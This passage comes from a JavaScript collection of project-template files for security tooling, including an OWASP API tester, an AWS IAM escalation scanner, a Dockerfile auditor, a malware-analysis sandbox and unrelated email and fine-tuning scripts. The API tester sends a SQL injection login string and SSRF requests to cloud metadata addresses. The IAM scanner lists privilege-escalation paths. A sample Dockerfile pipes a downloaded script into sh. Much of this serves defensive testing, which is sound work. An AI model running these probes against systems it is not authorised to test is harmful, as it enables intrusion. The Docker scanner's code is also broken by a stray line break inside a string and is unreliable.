                self._send(server, email, name, subject, html)  # type: ignore[arg-type]
                self.stats["sent"] += 1
                log.info(f"  [OK] {email}")
                results.append({"email": email, "status": "sent",
                                 "ts": datetime.now().isoformat()})
            except smtplib.SMTPRecipientsRefused:
                self.stats["bounced"] += 1
                results.append({"email": email, "status": "bounced"})
            except Exception as e:
                self.stats["failed"] += 1
                results.append({"email": email, "status": "failed", "error": str(e)})
            time.sleep(delay)
        if server:
            server.quit()
        log.info(f"Done: {self.stats}")
        return results

def main():
    ap = argparse.ArgumentParser(description="Email Campaign Bot")
    ap.add_argument("--list",     required=True, help="CSV contacts file")
    ap.add_argument("--template", required=True, help="HTML template file")
    ap.add_argument("--subject",  required=True)
    ap.add_argument("--delay",    type=float, default=1.0)
    ap.add_argument("--dry-run",  action="store_true")
    ap.add_argument("--output",   help="Output JSON results")
    args = ap.parse_args()
    smtp_host  = os.getenv("SMTP_HOST", "smtp.gmail.com")
    smtp_port  = int(os.getenv("SMTP_PORT", "587"))
    username   = os.getenv("SMTP_USER", "")
    password   = os.getenv("SMTP_PASS", "")
    from_name  = os.getenv("FROM_NAME", "Titan Mailer")
    from_email = os.getenv("FROM_EMAIL", username)
    with open(args.list)     as f: contacts  = list(csv.DictReader(f))
    with open(args.template) as f: html_tpl  = f.read()
    campaign = EmailCampaign(smtp_host, smtp_port, username, password, from_name, from_email)
    results  = campaign.run(contacts, args.subject, html_tpl, args.delay, args.dry_run)
    if args.output:
        with open(args.output, "w") as f: json.dump(results, f, indent=2)
        print(f"[*] Saved to {args.output}")

if __name__ == "__main__":
    main()
`,
    "template.html": `<!DOCTYPE html>
<html>
<head><meta charset="utf-8"><title>$subject</title></head>
<body style="font-family:Arial,sans-serif;max-width:600px;margin:0 auto;padding:20px">
  <h1 style="color:#333">Hello, $name!</h1>
  <p>$message</p>
  <hr style="border:none;border-top:1px solid #eee">
  <p style="color:#999;font-size:11px">
    <a href="$unsubscribe_url" style="color:#999">Unsubscribe</a>
  </p>
</body>
</html>
`,
    "contacts_example.csv": `email,name,message,unsubscribe_url
alice@example.com,Alice,Welcome to our platform!,https://example.com/unsub?id=1
bob@example.com,Bob,Check out our latest update,https://example.com/unsub?id=2
`,
    ".env.example": "SMTP_HOST=smtp.gmail.com\nSMTP_PORT=587\nSMTP_USER=you@gmail.com\nSMTP_PASS=your_app_password\nFROM_NAME=My Company\nFROM_EMAIL=noreply@mycompany.com\n",
    "requirements.txt": "# No external dependencies — stdlib only\n",
  },

  // ── 15. API Security Testing Suite ───────────────────────────────────────
  "api-security": {
    "README.md": `# API Security Testing Suite\n\nOWASP API Security Top 10 automated testing: BOLA, broken auth, SSRF, mass assignment, rate limiting bypass.\n\n## Quick Start\n\`\`\`bash\npip install -r requirements.txt\npython3 api_security.py --base-url https://api.example.com --spec openapi.json\npython3 api_security.py --base-url https://api.example.com --token "Bearer eyJ..." --output results.json\n\`\`\`${LEGAL}`,
    "api_security.py": `#!/usr/bin/env python3
"""API Security Testing Suite — OWASP API Security Top 10.
For authorised API security testing only."""
import argparse, json, re, time
import urllib.request, urllib.parse, urllib.error

class APISecurityTester:
    def __init__(self, base_url: str, token: str | None = None, timeout: int = 10):
        self.base_url = base_url.rstrip("/")
        self.token    = token
        self.timeout  = timeout
        self.findings: list[dict] = []

    def _headers(self, extra: dict | None = None) -> dict:
        h = {"User-Agent": "Mozilla/5.0 (APISecTest/1.0)",
             "Content-Type": "application/json"}
        if self.token:
            h["Authorization"] = self.token
        if extra:
            h.update(extra)
        return h

    def _req(self, method: str, path: str, data: dict | None = None,
             headers: dict | None = None) -> tuple[int, dict | str]:
        url  = self.base_url + path
        body = json.dumps(data).encode() if data else None
        req  = urllib.request.Request(url, data=body,
               headers=self._headers(headers), method=method.upper())
        try:
            with urllib.request.urlopen(req, timeout=self.timeout) as r:
                try:
                    return r.status, json.loads(r.read())
                except Exception:
                    return r.status, {}
        except urllib.error.HTTPError as e:
            return e.code, {}
        except Exception:
            return 0, {}

    # API1: BOLA / IDOR
    def test_bola(self, resource_path: str = "/users/{id}", ids: list[int] | None = None):
        print("[*] API1: BOLA/IDOR testing...")
        ids = ids or [1, 2, 3, 100, 999]
        accessible = []
        for i in ids:
            path = resource_path.replace("{id}", str(i))
            code, body = self._req("GET", path)
            if code == 200:
                accessible.append({"id": i, "path": path})
                print(f"  [INFO] Accessible: {path} -> HTTP {code}")
        if len(accessible) > 1:
            self.findings.append({"type": "Potential BOLA/IDOR", "severity": "HIGH",
                                   "accessible_ids": accessible,
                                   "note": "Multiple object IDs accessible — verify authorisation"})

    # API2: Broken Authentication
    def test_broken_auth(self, auth_path: str = "/auth/login"):
        print("[*] API2: Broken authentication...")
        # Test empty credentials
        code, _ = self._req("POST", auth_path, {"username": "", "password": ""})
        if code == 200:
            self.findings.append({"type": "Empty Credentials Accepted", "severity": "CRITICAL",
                                   "path": auth_path})
            print(f"  [CRITICAL] Empty credentials accepted at {auth_path}")
        # Test SQL injection in auth
        code, body = self._req("POST", auth_path,
                               {"username": "admin' OR '1'='1", "password": "x"})
        if code == 200:
            self.findings.append({"type": "SQLi in Auth", "severity": "CRITICAL",
                                   "path": auth_path})
            print(f"  [CRITICAL] SQLi in auth at {auth_path}")

    # API4: Unrestricted Resource Consumption (rate limit)
    def test_rate_limiting(self, path: str = "/"):
        print("[*] API4: Rate limiting...")
        codes: list[int] = []
        for _ in range(20):
            code, _ = self._req("GET", path)
            codes.append(code)
        if 429 not in codes:
            self.findings.append({"type": "No Rate Limiting", "severity": "MEDIUM",
                                   "path": path, "requests": 20,
                                   "note": "20 rapid requests — no 429 received"})
            print(f"  [MEDIUM] No rate limiting detected on {path}")
        else:
            print(f"  [OK] Rate limiting active (got 429 after {codes.index(429)+1} requests)")

    # API7: SSRF
    def test_ssrf(self, path: str = "/fetch"):
        print("[*] API7: SSRF testing...")
        ssrf_urls = [
            "http://169.254.169.254/latest/meta-data/",  # AWS metadata
            "http://metadata.google.internal/",           # GCP metadata
            "http://localhost:22",
            "http://127.0.0.1:3306",
        ]
        for url in ssrf_urls:
            code, body = self._req("POST", path, {"url": url})
            if code == 200 and body:
                self.findings.append({"type": "Potential SSRF", "severity": "HIGH",
                                       "path": path, "ssrf_url": url})
                print(f"  [HIGH] SSRF: {url} -> HTTP {code}")

    # API8: Security Misconfiguration
    def test_misconfig(self):
        print("[*] API8: Security misconfiguration...")
        sensitive_paths = [
            "/swagger.json", "/openapi.json", "/api-docs",
            "/.env", "/config.json", "/health", "/metrics",
            "/graphql", "/graphiql", "/__debug__",
        ]
        for path in sensitive_paths:
            code, _ = self._req("GET", path)
            if code == 200:
                self.findings.append({"type": "Exposed Endpoint", "severity": "MEDIUM",
                                       "path": path})
                print(f"  [MEDIUM] Exposed: {path}")

    def run_all(self) -> list[dict]:
        self.test_bola()
        self.test_broken_auth()
        self.test_rate_limiting()
        self.test_ssrf()
        self.test_misconfig()
        print(f"\\n[*] Total findings: {len(self.findings)}")
        return self.findings

def main():
    ap = argparse.ArgumentParser(description="API Security Testing Suite")
    ap.add_argument("--base-url", required=True)
    ap.add_argument("--token", help="Auth token (e.g. 'Bearer eyJ...')")
    ap.add_argument("--output", help="Output JSON file")
    args = ap.parse_args()
    tester = APISecurityTester(args.base_url, args.token)
    findings = tester.run_all()
    if args.output:
        with open(args.output, "w") as f: json.dump(findings, f, indent=2)
        print(f"[*] Saved to {args.output}")
    else:
        print(json.dumps(findings, indent=2))

if __name__ == "__main__":
    main()
`,
    "requirements.txt": "# No external dependencies — stdlib only\n",
  },

  // ── 16. Cloud IAM Scanner ─────────────────────────────────────────────────
  "cloud-iam-scanner": {
    "README.md": `# Cloud IAM Privilege Escalation Scanner\n\nAWS, Azure, and GCP IAM policy analyzer — finds over-permissioned roles and privilege escalation paths.\n\n## Quick Start\n\`\`\`bash\npip install -r requirements.txt\npython3 iam_scanner.py --cloud aws --profile default\npython3 iam_scanner.py --cloud aws --profile default --output iam_report.json\n\`\`\``,
    "iam_scanner.py": `#!/usr/bin/env python3
"""Cloud IAM Privilege Escalation Scanner — AWS, Azure, GCP."""
import argparse, json, subprocess, sys

# AWS privilege escalation paths (from known research)
AWS_ESCALATION_PATHS = [
    {"name": "iam:CreatePolicyVersion",      "risk": "CRITICAL", "desc": "Create new policy version with admin permissions"},
    {"name": "iam:SetDefaultPolicyVersion",  "risk": "CRITICAL", "desc": "Set an existing policy version with admin permissions"},
    {"name": "iam:PassRole + lambda:*",      "risk": "CRITICAL", "desc": "Create Lambda with admin role"},
    {"name": "iam:PassRole + ec2:*",         "risk": "CRITICAL", "desc": "Launch EC2 with admin instance profile"},
    {"name": "iam:CreateAccessKey",          "risk": "HIGH",     "desc": "Create access key for another user"},
    {"name": "iam:CreateLoginProfile",       "risk": "HIGH",     "desc": "Create console login for user without one"},
    {"name": "iam:UpdateLoginProfile",       "risk": "HIGH",     "desc": "Change another user's console password"},
    {"name": "iam:AttachUserPolicy",         "risk": "HIGH",     "desc": "Attach admin policy to self"},
    {"name": "iam:AttachGroupPolicy",        "risk": "HIGH",     "desc": "Attach admin policy to own group"},
    {"name": "sts:AssumeRole (wildcard)",    "risk": "HIGH",     "desc": "Assume any role in account"},
    {"name": "s3:GetObject on sensitive",    "risk": "MEDIUM",   "desc": "Read sensitive S3 buckets (terraform state, secrets)"},
    {"name": "secretsmanager:GetSecretValue","risk": "MEDIUM",   "desc": "Read all secrets"},
    {"name": "ssm:GetParameter (wildcard)",  "risk": "MEDIUM",   "desc": "Read all SSM parameters"},
]

def run_aws_cli(args_list: list[str]) -> dict | list | None:
    try:
        result = subprocess.run(
            ["aws"] + args_list + ["--output", "json"],
            capture_output=True, text=True, timeout=30
        )
        if result.returncode == 0:
            return json.loads(result.stdout)
    except Exception:
        pass
    return None

def scan_aws(profile: str | None = None) -> list[dict]:
    findings: list[dict] = []
    print("[*] AWS IAM scan...")

    extra = ["--profile", profile] if profile else []

    # Get caller identity
    identity = run_aws_cli(["sts", "get-caller-identity"] + extra)
    if identity:
        print(f"  Identity: {identity.get('Arn', 'unknown')}")

    # List attached policies for current user
    username_m = None
    if identity and "Arn" in identity:
        arn = identity["Arn"]
        if ":user/" in arn:
            username_m = arn.split(":user/")[-1]

    if username_m:
        policies = run_aws_cli(["iam", "list-attached-user-policies",
                                 "--user-name", username_m] + extra)
        if policies:
            for p in policies.get("AttachedPolicies", []):
                if "AdministratorAccess" in p.get("PolicyName", ""):
                    findings.append({"type": "Admin Policy Attached", "severity": "INFO",
                                      "policy": p["PolicyName"],
                                      "note": "User has full admin — no escalation needed"})

    # Simulate policy for escalation paths
    for path in AWS_ESCALATION_PATHS:
        findings.append({
            "type":      "Escalation Path",
            "name":      path["name"],
            "severity":  path["risk"],
            "description": path["desc"],
            "note":      "Run: aws iam simulate-principal-policy to verify",
        })

    print(f"  {len(findings)} potential findings (verify with simulate-principal-policy)")
    return findings

def main():
    ap = argparse.ArgumentParser(description="Cloud IAM Privilege Escalation Scanner")
    ap.add_argument("--cloud",   choices=["aws","azure","gcp"], default="aws")
    ap.add_argument("--profile", help="AWS profile name")
    ap.add_argument("--output",  help="Output JSON file")
    args = ap.parse_args()
    if args.cloud == "aws":
        findings = scan_aws(args.profile)
    else:
        print(f"[!] {args.cloud} support coming soon — use AWS for now")
        findings = []
    if args.output:
        with open(args.output, "w") as f: json.dump(findings, f, indent=2)
        print(f"[*] Saved to {args.output}")
    else:
        print(json.dumps(findings, indent=2))

if __name__ == "__main__":
    main()
`,
    "requirements.txt": "# Requires AWS CLI installed (pip install awscli)\nawscli>=2.0.0\n",
  },

  // ── 17. LLM Fine-Tuning Pipeline ─────────────────────────────────────────
  "llm-finetune": {
    "README.md": `# LLM Fine-Tuning Pipeline\n\nEnd-to-end pipeline for fine-tuning Llama, Mistral, and Phi on custom datasets using LoRA/QLoRA.\n\n## Quick Start\n\`\`\`bash\npip install -r requirements.txt\npython3 prepare_data.py --input raw_data.jsonl --output train.jsonl\npython3 finetune.py --model meta-llama/Llama-3.2-3B --data train.jsonl --output ./my-model\n\`\`\``,
    "prepare_data.py": `#!/usr/bin/env python3
"""Data preparation for LLM fine-tuning — converts raw data to instruction format."""
import argparse, json, random, sys

def to_instruction_format(item: dict) -> dict | None:
    """Convert various input formats to instruction-tuning format."""
    # Already in instruction format
    if "instruction" in item and "output" in item:
        return {"instruction": item["instruction"],
                "input":       item.get("input", ""),
                "output":      item["output"]}
    # Chat format
    if "messages" in item:
        msgs = item["messages"]
        user  = next((m["content"] for m in msgs if m["role"] == "user"), "")
        asst  = next((m["content"] for m in msgs if m["role"] == "assistant"), "")
        if user and asst:
            return {"instruction": user, "input": "", "output": asst}
    # Q&A format
    if "question" in item and "answer" in item:
        return {"instruction": item["question"], "input": "", "output": item["answer"]}
    return None

def main():
    ap = argparse.ArgumentParser(description="LLM Data Preparation")
    ap.add_argument("--input",  required=True, help="Input JSONL file")
    ap.add_argument("--output", required=True, help="Output JSONL file")
    ap.add_argument("--split",  type=float, default=0.9, help="Train/val split ratio")
    ap.add_argument("--max",    type=int, default=0, help="Max samples (0=all)")
    args = ap.parse_args()

    samples: list[dict] = []
    with open(args.input) as f:
        for line in f:
            line = line.strip()
            if not line: continue
            try:
                item = json.loads(line)
                converted = to_instruction_format(item)
                if converted:
                    samples.append(converted)
            except json.JSONDecodeError:
                continue

    if args.max:
        samples = samples[:args.max]

    random.shuffle(samples)
    split = int(len(samples) * args.split)
    train, val = samples[:split], samples[split:]

    with open(args.output, "w") as f:
        for s in train: f.write(json.dumps(s) + "\\n")

    val_path = args.output.replace(".jsonl", "_val.jsonl")
    with open(val_path, "w") as f:
        for s in val: f.write(json.dumps(s) + "\\n")

    print(f"[*] Train: {len(train)} samples -> {args.output}")
    print(f"[*] Val:   {len(val)} samples -> {val_path}")

if __name__ == "__main__":
    main()
`,
    "finetune.py": `#!/usr/bin/env python3
"""LLM Fine-Tuning with LoRA/QLoRA — Llama, Mistral, Phi support."""
import argparse, json, os, sys

def main():
    ap = argparse.ArgumentParser(description="LLM Fine-Tuning Pipeline")
    ap.add_argument("--model",    required=True, help="Base model (e.g. meta-llama/Llama-3.2-3B)")
    ap.add_argument("--data",     required=True, help="Training JSONL file")
    ap.add_argument("--output",   required=True, help="Output directory for fine-tuned model")
    ap.add_argument("--epochs",   type=int,   default=3)
    ap.add_argument("--lr",       type=float, default=2e-4)
    ap.add_argument("--batch",    type=int,   default=4)
    ap.add_argument("--lora-r",   type=int,   default=16)
    ap.add_argument("--lora-alpha", type=int, default=32)
    ap.add_argument("--quantize", choices=["4bit","8bit","none"], default="4bit")
    args = ap.parse_args()

    try:
        from transformers import AutoModelForCausalLM, AutoTokenizer, TrainingArguments
        from peft import LoraConfig, get_peft_model, TaskType
        from datasets import Dataset
        import torch
    except ImportError as e:
        print(f"[!] Missing dependency: {e}")
        print("[!] Run: pip install transformers peft datasets accelerate bitsandbytes")
        sys.exit(1)

    print(f"[*] Loading model: {args.model}")
    tokenizer = AutoTokenizer.from_pretrained(args.model)
    tokenizer.pad_token = tokenizer.eos_token

    load_kwargs: dict = {}
    if args.quantize == "4bit":
        from transformers import BitsAndBytesConfig
        load_kwargs["quantization_config"] = BitsAndBytesConfig(
            load_in_4bit=True, bnb_4bit_compute_dtype=torch.float16
        )
    elif args.quantize == "8bit":
        load_kwargs["load_in_8bit"] = True

    model = AutoModelForCausalLM.from_pretrained(args.model, **load_kwargs)

    lora_config = LoraConfig(
        task_type=TaskType.CAUSAL_LM,
        r=args.lora_r, lora_alpha=args.lora_alpha,
        target_modules=["q_proj","v_proj"],
        lora_dropout=0.05, bias="none",
    )
    model = get_peft_model(model, lora_config)
    model.print_trainable_parameters()

    # Load dataset
    samples: list[dict] = []
    with open(args.data) as f:
        for line in f:
            if line.strip():
                samples.append(json.loads(line))

    def format_sample(s: dict) -> str:
        inst = s.get("instruction","")
        inp  = s.get("input","")
        out  = s.get("output","")
        if inp:
            return f"### Instruction:\\n{inst}\\n\\n### Input:\\n{inp}\\n\\n### Response:\\n{out}"
        return f"### Instruction:\\n{inst}\\n\\n### Response:\\n{out}"

    texts = [format_sample(s) for s in samples]
    dataset = Dataset.from_dict({"text": texts})

    def tokenize(batch):
        return tokenizer(batch["text"], truncation=True, max_length=2048, padding="max_length")

    tokenized = dataset.map(tokenize, batched=True, remove_columns=["text"])

    training_args = TrainingArguments(
        output_dir=args.output,
        num_train_epochs=args.epochs,
        per_device_train_batch_size=args.batch,
        learning_rate=args.lr,
        logging_steps=10,
        save_steps=100,
        fp16=True,
        report_to="none",
    )

    from transformers import Trainer, DataCollatorForLanguageModeling
    trainer = Trainer(
        model=model,
        args=training_args,
        train_dataset=tokenized,
        data_collator=DataCollatorForLanguageModeling(tokenizer, mlm=False),
    )

    print("[*] Starting training...")
    trainer.train()
    model.save_pretrained(args.output)
    tokenizer.save_pretrained(args.output)
    print(f"[+] Model saved to {args.output}")

if __name__ == "__main__":
    main()
`,
    "requirements.txt": "transformers>=4.40.0\npeft>=0.10.0\ndatasets>=2.18.0\naccelerate>=0.29.0\nbitsandbytes>=0.43.0\ntorch>=2.2.0\n",
  },

  // ── 18. E2E Encryption Module ─────────────────────────────────────────────
  "e2e-encryption": {
    "README.md": `# End-to-End Encryption Module\n\nAES-256-GCM encryption, X25519 key exchange, HKDF key derivation, and perfect forward secrecy.\n\n## Quick Start\n\`\`\`bash\npython3 e2ee.py --encrypt "Hello World" --key-file my.key\npython3 e2ee.py --decrypt <ciphertext> --key-file my.key\n\`\`\``,
    "e2ee.py": `#!/usr/bin/env python3
"""End-to-End Encryption Module — AES-256-GCM, X25519, HKDF, perfect forward secrecy."""
import argparse, base64, json, os, sys

try:
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM
    from cryptography.hazmat.primitives.asymmetric.x25519 import X25519PrivateKey
    from cryptography.hazmat.primitives.kdf.hkdf import HKDF
    from cryptography.hazmat.primitives import hashes, serialization
    HAS_CRYPTO = True
except ImportError:
    HAS_CRYPTO = False

class E2EE:
    """AES-256-GCM with X25519 key exchange and HKDF key derivation."""

    @staticmethod
    def generate_keypair() -> tuple[bytes, bytes]:
        """Generate X25519 key pair. Returns (private_key_bytes, public_key_bytes)."""
        priv = X25519PrivateKey.generate()
        priv_bytes = priv.private_bytes(
            serialization.Encoding.Raw,
            serialization.PrivateFormat.Raw,
            serialization.NoEncryption()
        )
        pub_bytes = priv.public_key().public_bytes(
            serialization.Encoding.Raw, serialization.PublicFormat.Raw
        )
        return priv_bytes, pub_bytes

    @staticmethod
    def derive_shared_key(my_private: bytes, their_public: bytes,
                          context: bytes = b"titan-e2ee-v1") -> bytes:
        """Derive shared AES key via X25519 DH + HKDF-SHA256."""
        from cryptography.hazmat.primitives.asymmetric.x25519 import X25519PrivateKey, X25519PublicKey
        priv = X25519PrivateKey.from_private_bytes(my_private)
        pub  = X25519PublicKey.from_public_bytes(their_public)
        shared_secret = priv.exchange(pub)
        hkdf = HKDF(algorithm=hashes.SHA256(), length=32, salt=None, info=context)
        return hkdf.derive(shared_secret)

    @staticmethod
    def encrypt(plaintext: str | bytes, key: bytes) -> str:
        """Encrypt with AES-256-GCM. Returns base64-encoded nonce+ciphertext."""
        if isinstance(plaintext, str):
            plaintext = plaintext.encode()
        nonce = os.urandom(12)
        aesgcm = AESGCM(key)
        ct = aesgcm.encrypt(nonce, plaintext, None)
        return base64.b64encode(nonce + ct).decode()

    @staticmethod
    def decrypt(ciphertext_b64: str, key: bytes) -> str:
        """Decrypt AES-256-GCM ciphertext."""
        data   = base64.b64decode(ciphertext_b64)
        nonce  = data[:12]
        ct     = data[12:]
        aesgcm = AESGCM(key)
        return aesgcm.decrypt(nonce, ct, None).decode()

    @staticmethod
    def generate_symmetric_key() -> bytes:
        """Generate a random 256-bit AES key."""
        return os.urandom(32)

def main():
    if not HAS_CRYPTO:
        print("[!] pip install cryptography")
        sys.exit(1)
    ap = argparse.ArgumentParser(description="E2E Encryption Module")
    ap.add_argument("--encrypt",  help="Plaintext to encrypt")
    ap.add_argument("--decrypt",  help="Ciphertext (base64) to decrypt")
    ap.add_argument("--key-file", help="Key file path (hex)")
    ap.add_argument("--gen-key",  action="store_true", help="Generate new key")
    ap.add_argument("--gen-keypair", action="store_true", help="Generate X25519 key pair")
    args = ap.parse_args()

    if args.gen_key:
        key = E2EE.generate_symmetric_key()
        print(key.hex())
        return

    if args.gen_keypair:
        priv, pub = E2EE.generate_keypair()
        print(json.dumps({"private_key": priv.hex(), "public_key": pub.hex()}, indent=2))
        return

    key: bytes
    if args.key_file:
        with open(args.key_file) as f:
            key = bytes.fromhex(f.read().strip())
    else:
        key = E2EE.generate_symmetric_key()
        print(f"[*] Generated key: {key.hex()}")

    if args.encrypt:
        ct = E2EE.encrypt(args.encrypt, key)
        print(f"[+] Ciphertext: {ct}")
    elif args.decrypt:
        pt = E2EE.decrypt(args.decrypt, key)
        print(f"[+] Plaintext: {pt}")
    else:
        ap.print_help()

if __name__ == "__main__":
    main()
`,
    "requirements.txt": "cryptography>=42.0.0\n",
  },

  // ── 19. Docker Security Scanner ───────────────────────────────────────────
  "docker-scanner": {
    "README.md": `# Docker Security Scanner\n\nScans Docker images and Dockerfiles for vulnerabilities, secrets, misconfigurations, and CIS benchmark violations.\n\n## Quick Start\n\`\`\`bash\npip install -r requirements.txt\npython3 docker_scan.py --image nginx:latest\npython3 docker_scan.py --dockerfile ./Dockerfile --output scan.json\n\`\`\``,
    "docker_scan.py": `#!/usr/bin/env python3
"""Docker Security Scanner — image and Dockerfile analysis."""
import argparse, json, re, subprocess, sys

DOCKERFILE_RULES = [
    {"id": "DS001", "severity": "HIGH",   "pattern": r"^FROM.*:latest",
     "desc": "Using :latest tag — pin to specific version for reproducibility"},
    {"id": "DS002", "severity": "CRITICAL","pattern": r"^RUN.*curl.*\\|.*sh|^RUN.*wget.*\\|.*sh",
     "desc": "Piping curl/wget to shell — supply chain attack vector"},
    {"id": "DS003", "severity": "HIGH",   "pattern": r"^ENV.*(PASSWORD|SECRET|KEY|TOKEN)\\s*=",
     "desc": "Secret in ENV instruction — use build secrets or runtime injection"},
    {"id": "DS004", "severity": "MEDIUM", "pattern": r"^RUN.*apt-get.*--no-install-recommends",
     "desc": "Missing --no-install-recommends — increases image size and attack surface",
     "inverted": True},
    {"id": "DS005", "severity": "HIGH",   "pattern": r"^USER root$|^USER 0$",
     "desc": "Running as root — use non-root USER instruction"},
    {"id": "DS006", "severity": "MEDIUM", "pattern": r"^ADD http",
     "desc": "ADD with URL — use COPY + RUN curl for better caching and security"},
    {"id": "DS007", "severity": "LOW",    "pattern": r"^HEALTHCHECK",
     "desc": "No HEALTHCHECK instruction", "inverted": True},
    {"id": "DS008", "severity": "MEDIUM", "pattern": r"chmod 777|chmod -R 777",
     "desc": "World-writable permissions set in Dockerfile"},
]

def scan_dockerfile(path: str) -> list[dict]:
    findings: list[dict] = []
    with open(path) as f:
        lines = f.readlines()
    for rule in DOCKERFILE_RULES:
        matched = any(re.search(rule["pattern"], l.strip(), re.IGNORECASE) for l in lines)
        inverted = rule.get("inverted", False)
        if (matched and not inverted) or (not matched and inverted):
            line_nums = [i+1 for i, l in enumerate(lines)
                         if re.search(rule["pattern"], l.strip(), re.IGNORECASE)]
            findings.append({
                "rule": rule["id"], "severity": rule["severity"],
                "description": rule["desc"],
                "lines": line_nums if not inverted else [],
            })
            print(f"  [{rule['severity']}] {rule['id']}: {rule['desc'][:80]}")
    return findings

def scan_image(image: str) -> list[dict]:
    findings: list[dict] = []
    print(f"[*] Scanning image: {image}")

    # Check if image exists
    result = subprocess.run(["docker
 inspect", "--format", "{{.Id}}", image],
        capture_output=True, text=True
    )
    if result.returncode != 0:
        print(f"  [!] Image not found locally — pull it first: docker pull {image}")
        return findings

    # Check for root user
    user_result = subprocess.run(
        ["docker", "inspect", "--format", "{{.Config.User}}", image],
        capture_output=True, text=True
    )
    user = user_result.stdout.strip()
    if not user or user in ("root", "0"):
        findings.append({"rule": "DS005", "severity": "HIGH",
                          "description": "Container runs as root"})
        print("  [HIGH] DS005: Container runs as root")

    # Check for exposed ports
    ports_result = subprocess.run(
        ["docker", "inspect", "--format", "{{json .Config.ExposedPorts}}", image],
        capture_output=True, text=True
    )
    if ports_result.stdout.strip() not in ("null", "{}"):
        import json as _json
        try:
            ports = list(_json.loads(ports_result.stdout).keys())
            findings.append({"rule": "DS009", "severity": "INFO",
                              "description": f"Exposed ports: {ports}"})
            print(f"  [INFO] DS009: Exposed ports: {ports}")
        except Exception:
            pass

    return findings

def main():
    ap = argparse.ArgumentParser(description="Docker Security Scanner")
    ap.add_argument("--image",      help="Docker image to scan (e.g. nginx:latest)")
    ap.add_argument("--dockerfile", help="Dockerfile path to audit")
    ap.add_argument("--output",     help="Output JSON file")
    args = ap.parse_args()
    all_findings: list[dict] = []
    if args.dockerfile:
        print(f"[*] Scanning Dockerfile: {args.dockerfile}")
        all_findings.extend(scan_dockerfile(args.dockerfile))
    if args.image:
        all_findings.extend(scan_image(args.image))
    if not args.dockerfile and not args.image:
        ap.print_help(); sys.exit(1)
    if args.output:
        import json as _json
        with open(args.output, "w") as f: _json.dump(all_findings, f, indent=2)
        print(f"[*] Saved to {args.output}")
    else:
        import json as _json
        print(_json.dumps(all_findings, indent=2))

if __name__ == "__main__":
    main()
`,
    "example.Dockerfile": `FROM ubuntu:latest
RUN apt-get install -y curl
RUN curl https://example.com/script.sh | sh
ENV DATABASE_PASSWORD=supersecret
USER root
`,
    "requirements.txt": "# No Python dependencies — uses docker CLI\n",
  },

  // ── 20. Malware Analysis Sandbox Blueprint ────────────────────────────────
  "malware-sandbox": {
    "README.md": `# Malware Analysis Sandbox Blueprint\n\nDocker-based malware detonation environment with YARA scanning, IOC extraction, and MITRE ATT&CK mapping.\n\n## Quick Start\n\`\`\`bash\ndocker-compose up -d\npython3 analyze.py --file suspicious.exe --output report.json\n\`\`\`${LEGAL}`,
    "docker-compose.yml": `version: '3.8'
services:
  analyzer:
    build: .
    volumes:
      - ./samples:/samples:ro
      - ./reports:/reports
    environment:
      - VIRUSTOTAL_API_KEY=\${VIRUSTOTAL_API_KEY:-}
    networks:
      - isolated
  inetsim:
    image: remnux/inetsim
    networks:
      - isolated
networks:
  isolated:
    driver: bridge
    internal: true
`,
    "Dockerfile": `FROM python:3.11-slim
RUN apt-get update && apt-get install -y \\
    yara file binutils strings \\
    && rm -rf /var/lib/apt/lists/*
RUN pip install yara-python pefile requests
WORKDIR /app
COPY analyze.py yara_rules.yar ./
CMD ["python3", "analyze.py", "--help"]
`,
    "analyze.py": `#!/usr/bin/env python3
"""Malware Analysis Sandbox — static analysis, YARA, IOC extraction, ATT&CK mapping."""
import argparse, hashlib, json, os, re, subprocess, sys

def compute_hashes(path: str) -> dict:
    with open(path, "rb") as f:
        data = f.read()
    return {
        "md5":    hashlib.md5(data).hexdigest(),
        "sha1":   hashlib.sha1(data).hexdigest(),
        "sha256": hashlib.sha256(data).hexdigest(),
        "size":   len(data),
    }

def extract_strings(path: str, min_len: int = 6) -> list[str]:
    result = subprocess.run(["strings", "-n", str(min_len), path],
                             capture_output=True, text=True)
    return result.stdout.splitlines()[:500]

def extract_iocs(strings_list: list[str]) -> dict:
    iocs: dict[str, list] = {"ips": [], "domains": [], "urls": [], "emails": [], "hashes": []}
    ip_re     = re.compile(r"\b(?:\d{1,3}\.){3}\d{1,3}\b")
    domain_re = re.compile(r"\b(?:[a-zA-Z0-9-]+\.)+(?:com|net|org|io|ru|cn|xyz|top)\b")
    url_re    = re.compile(r"https?://[^\s\"'<>]{10,}")
    email_re  = re.compile(r"[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}")
    hash_re   = re.compile(r"\b[a-fA-F0-9]{32,64}\b")
    for s in strings_list:
        if ip_re.search(s):     iocs["ips"].extend(ip_re.findall(s))
        if domain_re.search(s): iocs["domains"].extend(domain_re.findall(s))
        if url_re.search(s):    iocs["urls"].extend(url_re.findall(s))
        if email_re.search(s):  iocs["emails"].extend(email_re.findall(s))
        if hash_re.search(s):   iocs["hashes"].extend(hash_re.findall(s))
    return {k: list(set(v))[:20] for k, v in iocs.items()}

def yara_scan(path: str, rules_path: str = "yara_rules.yar") -> list[str]:
    if not os.path.exists(rules_path):
        return ["yara_rules.yar not found — add YARA rules"]
    try:
        import yara
        rules = yara.compile(rules_path)
        matches = rules.match(path)
        return [str(m) for m in matches]
    except ImportError:
        result = subprocess.run(["yara", rules_path, path],
                                 capture_output=True, text=True)
        return result.stdout.splitlines()

def file_type(path: str) -> str:
    result = subprocess.run(["file", path], capture_output=True, text=True)
    return result.stdout.strip()

def analyze(path: str) -> dict:
    print(f"[*] Analyzing: {path}")
    strings_list = extract_strings(path)
    return {
        "file":     path,
        "type":     file_type(path),
        "hashes":   compute_hashes(path),
        "strings":  strings_list[:100],
        "iocs":     extract_iocs(strings_list),
        "yara":     yara_scan(path),
        "note":     "For dynamic analysis, detonate inside isolated VM/container",
    }

def main():
    ap = argparse.ArgumentParser(description="Malware Analysis Sandbox")
    ap.add_argument("--file",   required=True, help="File to analyze")
    ap.add_argument("--output", help="Output JSON report")
    args = ap.parse_args()
    report = analyze(args.file)
    if args.output:
        with open(args.output, "w") as f: json.dump(report, f, indent=2)
        print(f"[+] Report saved: {args.output}")
    else:
        print(json.dumps(report, indent=2))

if __name__ == "__main__":
    main()
`,
    "yara_rules.yar": `rule SuspiciousStrings {
    meta:
        description = "Detects common malware strings"
        severity = "MEDIUM"
    strings:
        $s1 = "cmd.exe" nocase
        $s2 = "powershell" nocase
        $s3 = "CreateRemoteThread"
        $s4 = "VirtualAllocEx"
        $s5 = "WriteProcessMemory"
        $s6 = "WinExec"
